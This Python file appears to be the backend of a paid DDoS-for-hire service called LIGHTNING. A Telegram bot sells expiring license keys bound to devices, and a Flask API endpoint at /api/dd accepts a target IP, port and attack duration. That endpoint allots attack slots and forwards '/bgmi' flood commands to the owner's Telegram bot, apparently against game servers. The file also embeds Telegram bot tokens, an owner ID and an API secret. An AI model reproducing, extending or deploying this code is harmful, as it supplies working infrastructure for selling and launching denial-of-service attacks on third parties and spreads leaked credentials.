#!/usr/bin/env python3
"""
⚡ LIGHTNING VPS ALL-IN-ONE
✅ APK secret SAME: RAGEBITE_SECRET_2026_CHANGE_ME
✅ DB name: lightning.db
"""

import os
import sqlite3
import threading
import time
import random
import string
from datetime import datetime, timedelta

import telebot
from telebot import apihelper
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

# ==================== CONFIG ====================
KEY_BOT_TOKEN = "8823908635:AAHO373_iqEcipIOdhACahEO-3O-ZipA21g"      # @KEY_SWARGBOT
DD_BOT_TOKEN  = "8650600804:AAFw-AuiLMtbUUHIbqwdPzVeOG8s11yfdA8"      # @test_swarg_bot
OWNER_ID = 6321758394

# ✅ APK me wahi secret hai
API_SECRET = "RAGEBITE_SECRET_2026_CHANGE_ME"
API_PORT = 5000

SLOTS = 4

DB_NAME = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'lightning.db')

STATUS_ACTIVE = "ACTIVE"
STATUS_EXPIRED = "EXPIRED"
STATUS_DELETED = "DELETED"
STATUS_DISABLED = "DISABLED"

rate_limit_store = {}
db_write_lock = threading.RLock()

apihelper.CONNECT_TIMEOUT = 10
apihelper.READ_TIMEOUT = 10


# ==================== DATABASE ====================
def get_conn():
    conn = sqlite3.connect(DB_NAME, check_same_thread=False, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")
    return conn


def init_db():
    conn = get_conn()
    c = conn.cursor()

    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        key TEXT PRIMARY KEY,
        device_id TEXT,
        expiry TEXT,
        status TEXT DEFAULT 'ACTIVE',
        slot_count INTEGER DEFAULT 4,
        created_at TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS slots (
        slot_id INTEGER PRIMARY KEY,
        device_id TEXT,
        key TEXT,
        ip TEXT,
        port TEXT,
        time_sec INTEGER,
        start_time TEXT,
        end_time TEXT,
        is_active INTEGER DEFAULT 0
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('maintenance', 'off')")

    for i in range(1, SLOTS + 1):
        c.execute('INSERT OR IGNORE INTO slots (slot_id, is_active) VALUES (?, 0)', (i,))

    conn.commit()
    conn.close()
    print(f"✅ Database ready: {DB_NAME}")


def get_maintenance():
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key='maintenance'")
    row = c.fetchone()
    conn.close()
    return row[0] if row else "off"


def set_maintenance(value):
    conn = get_conn()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES ('maintenance', ?)", (value,))
    conn.commit()
    conn.close()


def generate_key(days, slot_count=4):
    key = "LTN-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')

    conn = get_conn()
    c = conn.cursor()
    c.execute('''INSERT INTO keys (key, device_id, expiry, status, slot_count, created_at)
                 VALUES (?, NULL, ?, ?, ?, ?)''',
              (key, expiry, STATUS_ACTIVE, slot_count,
               datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()
    return key, expiry


def verify_key_with_device(key, device_id):
    with db_write_lock:
        conn = get_conn()
        try:
            c = conn.cursor()
            c.execute('SELECT expiry, status, device_id FROM keys WHERE key = ?', (key,))
            row = c.fetchone()
            if not row:
                return None, "NOT_FOUND", False
            expiry_str, status, existing_device = row
            if status == STATUS_DELETED:
                return None, "DELETED", False
            if status == STATUS_DISABLED:
                return None, "DISABLED", False
            expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
            if expiry < datetime.now():
                c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_EXPIRED, key))
                conn.commit()
                return None, "EXPIRED", False
            if existing_device is None:
                c.execute('UPDATE keys SET device_id = ? WHERE key = ?', (device_id, key))
                conn.commit()
                print(f"🔗 Device bound: {key[:15]}...")
                return int(expiry.timestamp() * 1000), "VALID", True
            elif existing_device == device_id:
                return int(expiry.timestamp() * 1000), "VALID", True
            else:
                return None, "DEVICE_MISMATCH", False
        finally:
            conn.close()


def allot_slot(device_id, key, ip, port, time_sec):
    with db_write_lock:
        conn = get_conn()
        try:
            c = conn.cursor()
            c.execute('SELECT slot_count FROM keys WHERE key = ?', (key,))
            row = c.fetchone()
            key_slot_count = row[0] if row else 4
            c.execute('SELECT COUNT(*) FROM slots WHERE key = ? AND is_active = 1', (key,))
            used = c.fetchone()[0]
            if used >= key_slot_count:
                return None, "KEY_SLOTS_FULL"
            c.execute('SELECT slot_id FROM slots WHERE device_id=? AND is_active=1', (device_id,))
            if c.fetchone():
                return None, "ALREADY_ACTIVE"
            c.execute('SELECT slot_id FROM slots WHERE is_active=0 ORDER BY slot_id ASC LIMIT 1')
            sr = c.fetchone()
            if not sr:
                return None, "ALL_SLOTS_FULL"
            slot_id = sr[0]
            start = datetime.now()
            end = start + timedelta(seconds=time_sec)
            c.execute('''UPDATE slots SET device_id=?, key=?, ip=?, port=?, 
                         time_sec=?, start_time=?, end_time=?, is_active=1 
                         WHERE slot_id=?''',
                      (device_id, key, ip, port, time_sec,
                       start.strftime('%Y-%m-%d %H:%M:%S'),
                       end.strftime('%Y-%m-%d %H:%M:%S'),
                       slot_id))
            conn.commit()
            return slot_id, "OK"
        finally:
            conn.close()


def release_slot(slot_id):
    with db_write_lock:
        conn = get_conn()
        try:
            c = conn.cursor()
            c.execute('''UPDATE slots SET device_id=NULL, key=NULL, ip=NULL, port=NULL,
                         time_sec=NULL, start_time=NULL, end_time=NULL, is_active=0 
                         WHERE slot_id=?''', (slot_id,))
            conn.commit()
        finally:
            conn.close()


def get_all_slots():
    conn = get_conn()
    try:
        c = conn.cursor()
        c.execute('SELECT * FROM slots ORDER BY slot_id')
        return c.fetchall()
    finally:
        conn.close()


def get_expired_slots():
    conn = get_conn()
    try:
        c = conn.cursor()
        now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        c.execute('SELECT slot_id FROM slots WHERE is_active=1 AND end_time <= ?', (now_str,))
        return c.fetchall()
    finally:
        conn.close()


def check_rate_limit(identifier, max_requests=15, window=60):
    now_ts = time.time()
    if identifier not in rate_limit_store:
        rate_limit_store[identifier] = []
    rate_limit_store[identifier] = [t for t in rate_limit_store[identifier] if now_ts - t < window]
    if len(rate_limit_store[identifier]) >= max_requests:
        return False
    rate_limit_store[identifier].append(now_ts)
    return True


def notify_owner_dd(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{DD_BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_ID, "text": text},
            timeout=5)
        print(f"📤 DM sent: {text[:50]}")
    except Exception as e:
        print(f"❌ DM error: {e}")


# ==================== FLASK API ====================
app = Flask(__name__)
CORS(app)


def check_auth():
    return request.headers.get('X-API-KEY') == API_SECRET


@app.route('/api/health', methods=['GET'])
def api_health():
    return jsonify({"status": "OK", "bot": "LIGHTNING"})


@app.route('/api/verify', methods=['POST'])
def api_verify():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json or {}
    key = data.get('key', '').upper().strip()
    device_id = data.get('device_id', '').strip()
    if not device_id:
        return jsonify({"status": "INVALID", "reason": "NoDeviceID"})
    if not key:
        return jsonify({"status": "INVALID", "reason": "NoKey"})
    expiry, status, _ = verify_key_with_device(key, device_id)
    if status == "VALID":
        return jsonify({"status": "VALID", "expiry": expiry})
    return jsonify({"status": "INVALID", "reason": status})


@app.route('/api/slots/status', methods=['GET'])
def api_slots_status():
    rows = get_all_slots()
    slots = []
    for r in rows:
        if r[8]:
            try:
                rem = int((datetime.strptime(r[7], '%Y-%m-%d %H:%M:%S') - datetime.now()).total_seconds())
            except:
                rem = 0
            slots.append({"slot": r[0], "status": "BUSY", "remaining": max(0, rem)})
        else:
            slots.append({"slot": r[0], "status": "FREE", "remaining": 0})
    active = sum(1 for s in slots if s["status"] == "BUSY")
    return jsonify({"slots": slots, "active": active, "max": SLOTS})


@app.route('/api/dd', methods=['POST'])
def api_dd():
    if not check_auth():
        return jsonify({"status": "ERROR", "reason": "Unauthorized"}), 401
    if get_maintenance() == "on":
        return jsonify({"status": "ERROR", "reason": "MAINTENANCE"})
    client_ip = request.remote_addr
    if not check_rate_limit(client_ip):
        return jsonify({"status": "ERROR", "reason": "RateLimit"})

    data = request.json or {}
    device_id = data.get('device_id', '').strip()
    key = data.get('key', '').upper().strip()
    ip = data.get('ip', '').strip()
    port = str(data.get('port', '')).strip()
    time_sec = int(data.get('time', 0))

    if not device_id:
        return jsonify({"status": "ERROR", "reason": "NoDeviceID"})
    if not key:
        return jsonify({"status": "ERROR", "reason": "NoKey"})
    if not ip or not port:
        return jsonify({"status": "ERROR", "reason": "MissingIPPort"})
    if time_sec < 10 or time_sec > 300:
        return jsonify({"status": "ERROR", "reason": "InvalidTime"})

    expiry, status, _ = verify_key_with_device(key, device_id)
    if status != "VALID":
        return jsonify({"status": "ERROR", "reason": status})

    slot_id, slot_status = allot_slot(device_id, key, ip, port, time_sec)
    if slot_status == "ALREADY_ACTIVE":
        return jsonify({"status": "ERROR", "reason": "AlreadyActive"})
    if slot_status == "KEY_SLOTS_FULL":
        return jsonify({"status": "ERROR", "reason": "KeySlotsFull"})
    if slot_id is None:
        return jsonify({"status": "ERROR", "reason": "SlotsFull"})

    notify_owner_dd(f"/bgmi {ip} {port} {time_sec}")

    details = (
        f"⚡ LIGHTNING ATTACK\n\n"
        f"🔑 Key: {key}\n"
        f"📱 Device: {device_id[:20]}...\n"
        f"🎯 Target: {ip}:{port}\n"
        f"⏱ Time: {time_sec}s\n"
        f"📌 Slot: #{slot_id}\n"
        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    notify_owner_dd(details)

    print(f"✅ Attack: {ip}:{port} | Slot {slot_id}")
    end = datetime.now() + timedelta(seconds=time_sec)
    return jsonify({
        "status": "SLOT_ALLOTTED",
        "slot": slot_id,
        "ip": ip,
        "port": port,
        "time": time_sec,
        "end_time": end.strftime('%H:%M:%S')
    })


def auto_release_loop():
    while True:
        try:
            for (slot_id,) in get_expired_slots():
                release_slot(slot_id)
                print(f"✅ Released slot #{slot_id}")
        except Exception as e:
            print(f"Auto-release: {e}")
        time.sleep(5)


# ==================== KEY BOT ====================
bot = telebot.TeleBot(KEY_BOT_TOKEN)


def is_owner(uid):
    return str(uid) == str(OWNER_ID)


@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_owner(message.from_user.id):
        return
    maint = get_maintenance()
    bot.reply_to(message, f"""⚡ **LIGHTNING KEY BOT**

🔧 Maintenance: {'🔴 ON' if maint == 'on' else '🟢 OFF'}

**Commands:**
`/genkey <days> [slots]`
`/listkeys`
`/delkey <key>`
`/maintenance on|off`

**Example:** `/genkey 30 4`
""", parse_mode='Markdown')


@bot.message_handler(commands=['maintenance'])
def cmd_maintenance(message):
    if not is_owner(message.from_user.id):
        return
    cmd = message.text.split()
    if len(cmd) < 2:
        bot.reply_to(message, f"🔧 Maintenance: {'🔴 ON' if get_maintenance() == 'on' else '🟢 OFF'}")
        return
    if cmd[1].lower() == "on":
        set_maintenance("on")
        bot.reply_to(message, "🔧 **MAINTENANCE: ON**")
    elif cmd[1].lower() == "off":
        set_maintenance("off")
        bot.reply_to(message, "✅ **MAINTENANCE: OFF**")


@bot.message_handler(commands=['genkey'])
def cmd_genkey(message):
    if not is_owner(message.from_user.id):
        return
    cmd = message.text.split()
    if len(cmd) < 2:
        bot.reply_to(message, "❌ `/genkey <days> [slots]`\nExample: `/genkey 30 4`", parse_mode='Markdown')
        return
    try:
        days = int(cmd[1])
        slots = int(cmd[2]) if len(cmd) > 2 else 4
    except ValueError:
        bot.reply_to(message, "❌ Invalid numbers")
        return
    if days < 1 or days > 3650:
        bot.reply_to(message, "❌ Days 1-3650")
        return
    if slots < 1 or slots > 4:
        slots = 4
    key, expiry = generate_key(days, slots)
    bot.reply_to(message, f"""⚡ **LIGHTNING KEY**

🔑 `{key}`
📅 {expiry}
⏱ {days} days
🎯 {slots} slots""", parse_mode='Markdown')


@bot.message_handler(commands=['listkeys'])
def cmd_listkeys(message):
    if not is_owner(message.from_user.id):
        return
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT key, status, expiry FROM keys ORDER BY created_at DESC LIMIT 20')
    rows = c.fetchall()
    conn.close()
    if not rows:
        bot.reply_to(message, "ℹ️ No keys")
        return
    r = "⚡ **LIGHTNING KEYS**\n\n"
    for k in rows:
        r += f"`{k[0]}`\n  {k[1]} | {k[2]}\n\n"
    bot.reply_to(message, r, parse_mode='Markdown')


@bot.message_handler(commands=['delkey'])
def cmd_delkey(message):
    if not is_owner(message.from_user.id):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        bot.reply_to(message, "❌ `/delkey <key>`")
        return
    key = cmd[1].upper()
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_DELETED, key))
    conn.commit()
    conn.close()
    bot.reply_to(message, f"✅ `{key}` deleted")


def run_key_bot():
    while True:
        try:
            bot.polling(non_stop=True, interval=1, timeout=10, long_polling_timeout=10)
        except Exception as e:
            print(f"⚠️ Key Bot: {e}")
            time.sleep(5)


# ==================== MAIN ====================
def main():
    init_db()
    print("=" * 60)
    print("⚡ LIGHTNING VPS")
    print("=" * 60)
    print(f"📊 Slots: {SLOTS}")
    print(f"🌐 API Port: {API_PORT}")
    print(f"🔑 API Secret: {API_SECRET}")
    print(f"🔧 Maintenance: {get_maintenance().upper()}")
    print(f"🤖 Key Bot: @KEY_SWARGBOT")
    print(f"📩 DD Bot: @test_swarg_bot")
    print("=" * 60)
    print("✅ Running...")
    print("=" * 60)

    threading.Thread(target=auto_release_loop, daemon=True).start()
    threading.Thread(target=run_key_bot, daemon=True).start()

    app.run(host='0.0.0.0', port=API_PORT, debug=False, use_reloader=False, threaded=True)


if __name__ == '__main__':
    main()
